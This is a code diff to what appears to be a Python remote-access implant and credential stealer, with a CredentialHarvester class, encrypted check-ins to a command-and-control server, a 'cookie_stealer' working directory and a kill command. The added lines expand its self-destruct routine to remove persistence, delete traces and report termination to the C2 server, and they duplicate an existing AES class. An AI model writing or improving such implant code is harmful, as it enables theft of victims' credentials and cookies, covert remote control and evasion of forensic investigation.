@@ -77,6 +77,30 @@ class Crypto:
         return json.loads(unpad(pt, AES.block_size))
 
 # ======================
+# Encryption
+# ======================
+class Crypto:
+    def __init__(self, key, iv):
+        if len(key) not in {16, 24, 32}:
+            raise ValueError(f"Invalid AES key length ({len(key)} bytes)")
+        if len(iv) != 16:
+            raise ValueError(f"Invalid AES IV length ({len(iv)} bytes)")
+        self.key = key
+        self.iv = iv
+
+    def encrypt(self, data):
+        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
+        padded_data = pad(json.dumps(data).encode(), AES.block_size)
+        ct_bytes = cipher.encrypt(padded_data)
+        return base64.b64encode(ct_bytes).decode()
+
+    def decrypt(self, enc_data):
+        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
+        ct = base64.b64decode(enc_data)
+        pt = cipher.decrypt(ct)
+        return json.loads(unpad(pt, AES.block_size))
+
+# ======================
 # Credential Harvester
 # ======================
 class CredentialHarvester:
@@ -1439,7 +1463,16 @@ class Agent:
     def _immediate_self_destruct(self):
         """Force immediate termination with server notification"""
         try:
-            # Try to notify server (best effort)
+            # 1. Disconnect all active connections
+            self.stop()
+            
+            # 2. Remove all persistence mechanisms
+            self._remove_persistence()
+            
+            # 3. Additional cleanup - delete temporary files
+            self._cleanup_temp_files()
+            
+            # 4. Try to notify server (best effort)
             try:
                 requests.post(
                     f"{self.config.C2_SERVER}/api/agent_terminated",
@@ -1452,19 +1485,36 @@ class Agent:
                         "User-Agent": self.config.USER_AGENT,
                         "Content-Type": "application/octet-stream"
                     },
-                    timeout=2,  # Short timeout
+                    timeout=2,
                     verify=False
                 )
-            except Exception as e:
-                self._log_error(f"Final notification failed: {str(e)}")
+            except:
+                pass
             
-            # Forceful process termination
+            # 5. Forceful process termination
             self._force_kill_process()
             
         except Exception as e:
             self._log_error(f"Termination error: {str(e)}")
         finally:
-            os._exit(0)  # Most forceful exit
+            os._exit(0)
+
+    def _cleanup_temp_files(self):
+        """Clean up any temporary files created by the agent"""
+        try:
+            temp_dirs = [
+                os.path.join(os.getenv('TEMP'), 'cookie_stealer'),
+                os.path.join(os.getenv('PUBLIC'), 'documents')
+            ]
+            
+            for temp_dir in temp_dirs:
+                try:
+                    if os.path.exists(temp_dir):
+                        shutil.rmtree(temp_dir, ignore_errors=True)
+                except:
+                    pass
+        except:
+            pass
 
     def _force_kill_process(self):
         """Platform-specific forceful process termination"""
@@ -1736,11 +1786,50 @@ class Agent:
             #Kill-pill
             elif task_type == "kill":
                 if task.get("data", {}).get("force"):
+                    # Send confirmation before killing
+                    try:
+                        requests.post(
+                            f"{self.config.C2_SERVER}/api/agent_terminated",
+                            data=self.crypto.encrypt({
+                                "agent_id": self.agent_id,
+                                "status": "killing",
+                                "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+                            }),
+                            headers={
+                                "User-Agent": self.config.USER_AGENT,
+                                "Content-Type": "application/octet-stream"
+                            },
+                            timeout=2,
+                            verify=False
+                        )
+                    except:
+                        pass
+                    
                     self._immediate_self_destruct()
-                    return {"status": "killing"}  # This won't actually be sent
+                    return {"status": "killing"}
                 
                 # Normal kill with cleanup
                 self._log_info("[!] Received kill command - initiating self-destruct")
+                
+                # Send confirmation first
+                try:
+                    requests.post(
+                        f"{self.config.C2_SERVER}/api/agent_terminated",
+                        data=self.crypto.encrypt({
+                            "agent_id": self.agent_id,
+                            "status": "killing",
+                            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+                        }),
+                        headers={
+                            "User-Agent": self.config.USER_AGENT,
+                            "Content-Type": "application/octet-stream"
+                        },
+                        timeout=2,
+                        verify=False
+                    )
+                except:
+                    pass
+                    
                 self._self_destruct()
                 return {"status": "destructing"}
 
